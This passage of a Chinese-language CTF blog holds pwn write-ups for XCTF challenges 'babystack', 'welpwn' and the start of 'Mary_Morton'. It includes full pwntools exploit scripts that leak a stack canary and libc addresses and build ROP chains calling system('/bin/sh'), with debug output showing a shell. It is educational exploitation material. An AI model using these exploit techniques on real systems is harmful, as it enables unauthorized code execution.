‘A’</em>(0x90-0x8))。后面的’\n’将覆盖cookie的末尾\x00，然后print选项即可。</li><li>得到cookie我们再次store来构造payload泄露真实地址，获取libc版本：payload1 = ‘B’<em>(0x90-0x8) + p64(cookie) + ‘B’</em>8 + p64(pop_rdi_ret)   最后面的地址时main函数，我们还需要进行一次攻击</li><li>payload1 += p64(libc_start_main_got) + p64(puts_plt) + p64(0x00000400908)</li><li>用LicbSearcher获取libc版本，地址，从而得到system  binsh地址</li><li>再次store放入system  binsh   payload</li><li>3quit    实现跳转</li></ul><p><strong>要注意这个程序得自己来实现最后的 return 0；也就是3选项</strong></p><h2 id="5：EXP"><a href="#5：EXP" class="headerlink" title="5：EXP"></a>5：EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babystack'</span><span class="token punctuation">)</span>libc_start_main_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400a93</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040067e</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',37000)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##############leaking cookie#################"</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span>cookie <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xa</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##############leaking real addr#################"</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x00000400908</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>libc_start_main <span class="token operator">=</span>  u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_start_main<span class="token punctuation">)</span><span class="token keyword">print</span> type<span class="token punctuation">(</span>libc_start_main<span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span>libc_start_main<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"libc_addr==>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##############fina attack#################"</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token number">8</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>结果：<span class="token operator">>></span> $ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><p>我在本地测试是完全没问题的但，换成远程就不行了，我觉的是对面的服务器抽风了</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-WELPWM</title>
      <link href="/2020/07/19/xctf-challenge-welpwm/"/>
      <url>/2020/07/19/xctf-challenge-welpwm/</url>
      
        <content type="html"><![CDATA[<h2 id="1-checksec"><a href="#1-checksec" class="headerlink" title="1:checksec"></a>1:checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec welpwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/welpwn'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>64位，开启NX防护</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c">main函数：<span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-400h]</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Welcome to RCTF\n"</span><span class="token punctuation">,</span> <span class="token number">16uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x400uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">echo</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment" spellcheck="true">// 传入buf地址</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>这里buf距离RBP距离与read可以读入的大小相同，所以主函数不存在溢出echo函数：<span class="token keyword">int</span> __fastcall <span class="token function">echo</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    #这个<span class="token keyword">for</span>循环可以将buf中的字符逐个复制到数组s2中，截断条件是\x00    s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"ROIS"</span><span class="token punctuation">,</span> s2<span class="token punctuation">)</span> <span class="token punctuation">)</span>      #这个<span class="token keyword">if</span>完全没必要进去，可能是提醒你注意复制过程的截断问题  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RCTF{Welcome}"</span><span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">" is not flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>没有system，binsh存在，只有puts，read，write等函数，没有后门。看来我们得想办法泄露libc地址了</p><h2 id="3：思路"><a href="#3：思路" class="headerlink" title="3：思路"></a>3：思路</h2><p>在主函数中buf可以容下0x400个字节，但无法溢出。在echo函数中会对buf无限制复制，到s2数组中，当然只要不出现\x00。所以要在main函数中好好构造payload。<br>在main函数中输入时：’A’<em>16 + ‘A’</em>8 + p64(destination).这就应该能跳转到我们的目的地址。我们要达到的目的是泄露某个函数真正的地址，从而获得libc版本，地址，进而获得system，binsh地址。</p><h3 id="payload位置问题"><a href="#payload位置问题" class="headerlink" title="payload位置问题"></a>payload位置问题</h3><p>这差不多是一个ret2libc问题，所以payload上构造的函数，参数少不了。那么问题是echo函数中只有一个大小为16的数组肯定，我们构造的payload的关键函数无法放在那里。那我们来看看栈的分布情况。</p><pre class=" language-bash"><code class="language-bash">main函数全部的汇编push    rbpmov     rbp, rspsub     rsp, 400hnopnopnopnopnopnopnopnopnopnopmov     edx, 10h        <span class="token punctuation">;</span> nmov     esi, offset aWelcomeToRctf <span class="token punctuation">;</span> <span class="token string">"Welcome to RCTF\n"</span>        <span class="token comment" spellcheck="true">#可以看到除了开始部分，下面的代码并没有改变RBP和RSP</span>mov     edi, 1          <span class="token punctuation">;</span> fdcall    _writemov     rax, cs:__bss_startmov     rdi, rax        <span class="token punctuation">;</span> streamcall    _fflushlea     rax, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>mov     edx, 400h       <span class="token punctuation">;</span> nbytesmov     rsi, rax        <span class="token punctuation">;</span> bufmov     edi, 0          <span class="token punctuation">;</span> fdcall    _readlea     rax, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>mov     rdi, raxcall    <span class="token keyword">echo</span>mov     eax, 0leaveretnecho函数前部分汇编var_18<span class="token operator">=</span> qword ptr -18hs2<span class="token operator">=</span> byte ptr -10h<span class="token punctuation">;</span> __unwind <span class="token punctuation">{</span>push    rbpmov     rbp, rspsub     rsp, 20hmov     <span class="token punctuation">[</span>rbp+var_18<span class="token punctuation">]</span>, rdimov     cs:i, 0</code></pre><p>可以看到这两个函数的栈分布应该是很普通的：<br><img src="https://s1.ax1x.com/2020/07/19/UWq0Ag.png" alt=""><br><strong>我们在main函数中构造的payload，会被echo函数复制到它的栈空间，以此我们可以把返回地址覆盖成我们想要的，但只能复制一个地址。因为p64（地址）会出现\x00截断。不过通过这个设计漏洞我们可以控制程序流程。</strong></p><h3 id="流程控制问题"><a href="#流程控制问题" class="headerlink" title="流程控制问题"></a>流程控制问题</h3><p>现在关键在于返回地址我们要覆盖成什么地址。我们知道在buf中前24个字符是padding，被复制给s2数组。下面就是我们覆盖地址。覆盖地址下面还可以构造函数，所以得返回到buf。<br>前面24个padding+一个地址 会占用4个栈帧，我们可以pop掉。<br><img src="https://s1.ax1x.com/2020/07/19/UWqDhj.png" alt=""><br>所以payload = ‘A’*24 + p64(pop_4_ret) + p64(pop_rdi_ret) + p64(got) +p64(puts_ptl) + p64(main)<br>pop 4次后程序就流会被p64(pop_rdi_ret) + p64(got) +p64(puts_ptl) + p64(main)控制，输出某一个函数的正真地址，这是第一次攻击，然后返回到main函数我们可以以类似的方式构造payload来 执行system binsh。<br>这里用puts来输出地址，没用write，因为找不到pop rdx 这个gadget。</p><p>一开始我就是卡在了如何把前面的padding pop掉的问题，没想到直接可以找一个pop4次的地址来跳转。</p><h2 id="4：寻找gadgets"><a href="#4：寻找gadgets" class="headerlink" title="4：寻找gadgets"></a>4：寻找gadgets</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ ROPgadget --binary welpwn --only <span class="token string">"pop|ret"</span>Gadgets information<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>0x000000000040089c <span class="token keyword">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret        <span class="token comment" spellcheck="true">#选这个保险没有涉及到关键寄存器</span>0x000000000040089e <span class="token keyword">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x00000000004008a0 <span class="token keyword">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x00000000004008a2 <span class="token keyword">:</span> pop r15 <span class="token punctuation">;</span> ret0x000000000040089b <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x000000000040089f <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x0000000000400675 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret0x00000000004008a3 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret                                   <span class="token comment" spellcheck="true">#这个要用来pop  rdi参数</span>0x00000000004008a1 <span class="token keyword">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x000000000040089d <span class="token keyword">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x0000000000400589 <span class="token keyword">:</span> ret0x00000000004006a5 <span class="token keyword">:</span> ret 0xc1480x000000000040081a <span class="token keyword">:</span> ret 0xfffd</code></pre><h2 id="5-EXP"><a href="#5-EXP" class="headerlink" title="5:EXP"></a>5:EXP</h2><p>我写的EXP巨丑</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'welpwn'</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>libc_start_main_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_plt==>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gadgates</span><span class="token comment" spellcheck="true">#0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><span class="token comment" spellcheck="true">#0x00000000004008a3 : pop rdi ; ret</span><span class="token comment" spellcheck="true">#0x0000000000400589 : ret   #遇到system调用的堆栈平衡问题了</span><span class="token comment" spellcheck="true">#sh = process('./welpwn')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">41564</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0040089c</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x04008a3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4005a0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#第一次攻击</span><span class="token comment" spellcheck="true">#payload = p64(0x00000000004008a3)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>libc_start_main <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_start_main<span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span>libc_start_main<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"libc_addr==>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0040089c</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x04008a3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#第二次攻击</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0400589</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>结果：<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x41</span> bytes<span class="token punctuation">:</span>    <span class="token number">00000000</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│    <span class="token number">00000010</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">9c</span> <span class="token number">08</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  │AAAA│AAAA│··@·│····│    <span class="token number">00000020</span>  a3 <span class="token number">08</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">9a</span> <span class="token number">2e</span> <span class="token number">4e</span> <span class="token number">90</span>  <span class="token number">93</span> <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  │··@·│····│·<span class="token punctuation">.</span>N·│····│    <span class="token number">00000030</span>  <span class="token number">89</span> <span class="token number">05</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">40</span> e4 <span class="token number">37</span> <span class="token number">90</span>  <span class="token number">93</span> <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  │··@·│····│@·<span class="token number">7</span>·│····│    <span class="token number">00000040</span>  <span class="token number">0a</span>                                                  │·│    <span class="token number">00000041</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><p><strong>这个题，漏洞在其他函数而payload构造在主函数。</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-challenge-Mary_Morton</title>
      <link href="/2020/07/18/xctf-challenge-mary-morton/"/>
      <url>/2020/07/18/xctf-challenge-mary-morton/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec Mary_Morton<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/Mary_Morton'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>Canary  NX防护打开</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-Ch]</span>  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4009FF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  #setbuf   <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to the battle ! "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[Great Fairy] level pwned "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Select your weapon "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">sub_4009DA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           #输出提示符      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span 